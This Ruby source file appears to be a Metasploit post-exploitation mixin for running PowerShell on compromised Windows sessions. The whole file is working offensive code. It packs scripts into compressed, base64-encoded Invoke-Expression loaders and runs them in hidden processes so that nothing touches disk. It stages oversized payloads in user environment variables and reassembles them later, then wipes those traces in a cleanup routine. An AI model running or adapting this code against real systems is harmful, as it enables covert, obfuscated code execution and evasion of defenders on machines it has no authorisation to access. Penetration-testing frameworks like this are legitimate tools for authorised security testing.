# -*- coding: binary -*-
require 'zlib'
require 'msf/core/post/common'

module Msf
class Post
module Windows

module Powershell
	include ::Msf::Post::Common


	# List of running processes, open channels, and env variables...


	# Suffix for environment variables

	#
	# Returns true if powershell is installed
	#
	def have_powershell?
		cmd_out = cmd_exec("powershell get-host")
		return true if cmd_out =~ /Name.*Version.*InstanceID/
		return false
	end

	#
	# Insert substitutions into the powershell script
	#
	def make_subs(script, subs)
		subs.each do |set|
			script.gsub!(set[0],set[1])
		end
		if datastore['VERBOSE']
			print_good("Final Script: ")
			script.each_line {|l| print_status("\t#{l}")}
		end
	end

	#
	# Return an array of substitutions for use in make_subs
	#
	def process_subs(subs)
		return [] if subs.nil? or subs.empty?
		new_subs = []
		subs.split(';').each do |set|
			new_subs << set.split(',', 2)
		end
		return new_subs
	end

	#
	# Read in a powershell script stored in +script+
	#
	def read_script(script)
		script_in = ''
		begin
			# Open script file for reading
			fd = ::File.new(script, 'r')
			while (line = fd.gets)
				script_in << line
			end

			# Close open file
			fd.close()
		rescue Errno::ENAMETOOLONG, Errno::ENOENT
			# Treat script as a... script
			script_in = script
		end
		return script_in
	end


	#
	# Return a zlib compressed powershell script
	#
	def compress_script(script_in, eof = nil)

		# Compress using the Deflate algorithm
		compressed_stream = ::Zlib::Deflate.deflate(script_in,
			::Zlib::BEST_COMPRESSION)

		# Base64 encode the compressed file contents
		encoded_stream = Rex::Text.encode_base64(compressed_stream)

		# Build the powershell expression
		# Decode base64 encoded command and create a stream object
		psh_expression =  "$stream = New-Object IO.MemoryStream(,"
		psh_expression += "$([Convert]::FromBase64String('#{encoded_stream}')));"
		# Read & delete the first two bytes due to incompatibility with MS
		psh_expression += "$stream.ReadByte()|Out-Null;"
		psh_expression += "$stream.ReadByte()|Out-Null;"
		# Uncompress and invoke the expression (execute)
		psh_expression += "$(Invoke-Expression $(New-Object IO.StreamReader("
		psh_expression += "$(New-Object IO.Compression.DeflateStream("
		psh_expression += "$stream,"
		psh_expression += "[IO.Compression.CompressionMode]::Decompress)),"
		psh_expression += "[Text.Encoding]::ASCII)).ReadToEnd());"

		# If eof is set, add a marker to signify end of script output
		if (eof && eof.length == 8) then psh_expression += "'#{eof}'" end

		# Convert expression to unicode
		unicode_expression = Rex::Text.to_unicode(psh_expression)

		# Base64 encode the unicode expression
		encoded_expression = Rex::Text.encode_base64(unicode_expression)

		return encoded_expression
	end

	#
	# Execute a powershell script and return the results. The script is never written
	# to disk.
	#
	def execute_script(script, time_out = 15)
		running_pids, open_channels = [], []
		# Execute using -EncodedCommand
		session.response_timeout = time_out
		cmd_out = session.sys.process.execute("powershell -EncodedCommand " +
			"#{script}", nil, {'Hidden' => true, 'Channelized' => true})

		# Add to list of running processes
		running_pids << cmd_out.pid

		# Add to list of open channels
		open_channels << cmd_out

		return [cmd_out, running_pids, open_channels]
	end


	#
	# Powershell scripts that are longer than 8000 bytes are split into 8000
	# 8000 byte chunks and stored as environment variables. A new powershell
	# script is built that will reassemble the chunks and execute the script.
	# Returns the reassembly script.
	#
	def stage_to_env(compressed_script, env_suffix = Rex::Text.rand_text_alpha(8))

		# Check to ensure script is encoded and compressed
		if compressed_script =~ /\s|\.|\;/
			compressed_script = compress_script(compressed_script)
		end
		# Divide the encoded script into 8000 byte chunks and iterate
		index = 0
		count = 8000
		while (index < compressed_script.size - 1)
			# Define random, but serialized variable name
			env_prefix = "%05d" % ((index + 8000)/8000)
			env_variable = env_prefix + env_suffix

			# Create chunk
			chunk = compressed_script[index, count]

			# Build the set commands
			set_env_variable =  "[Environment]::SetEnvironmentVariable("
			set_env_variable += "'#{env_variable}',"
			set_env_variable += "'#{chunk}', 'User')"

			# Compress and encode the set command
			encoded_stager = compress_script(set_env_variable)

			# Stage the payload
			print_good(" - Bytes remaining: #{compressed_script.size - index}")
			execute_script(encoded_stager)

			# Increment index
			index += count

		end

		# Build the script reassembler
		reassemble_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
		reassemble_command += "Select-String #{env_suffix}|Sort-Object|%{"
		reassemble_command += "$c+=[Environment]::GetEnvironmentVariable($_,'User')"
		reassemble_command += "};Invoke-Expression $($([Text.Encoding]::Unicode."
		reassemble_command += "GetString($([Convert]::FromBase64String($c)))))"

		# Compress and encode the reassemble command
		encoded_script = compress_script(reassemble_command)

		return encoded_script
	end

	#
	# Log the results of the powershell script
	#
	def write_to_log(cmd_out, log_file, eof)
		# Open log file for writing
		fd = ::File.new(log_file, 'w+')

		# Read output until eof and write to log
		while (line = cmd_out.channel.read())
			if (line.sub!(/#{eof}/, ''))
				fd.write(line)
				vprint_good("\t#{line}")
				cmd_out.channel.close()
				break
			end
			fd.write(line)
			vprint_good("\t#{line}")
		end

		# Close log file
		fd.close()

		return
	end

	#
	# Clean up powershell script including process and chunks stored in environment variables
	#
	def clean_up(script_file = nil, eof = '', running_pids =[], open_channels = [], env_suffix = Rex::Text.rand_text_alpha(8), delete = false)
		# Remove environment variables
		env_del_command =  "[Environment]::GetEnvironmentVariables('User').keys|"
		env_del_command += "Select-String #{env_suffix}|%{"
		env_del_command += "[Environment]::SetEnvironmentVariable($_,$null,'User')}"
		script = compress_script(env_del_command, eof)
		cmd_out, running_pids, open_channels = *execute_script(script)
		write_to_log(cmd_out, "/dev/null", eof)

		# Kill running processes
		running_pids.each() do |pid|
			session.sys.process.kill(pid)
		end


		# Close open channels
		open_channels.each() do |chan|
			chan.channel.close()
		end

		::File.delete(script_file) if (script_file and delete)

		return
	end

end
end
end
end

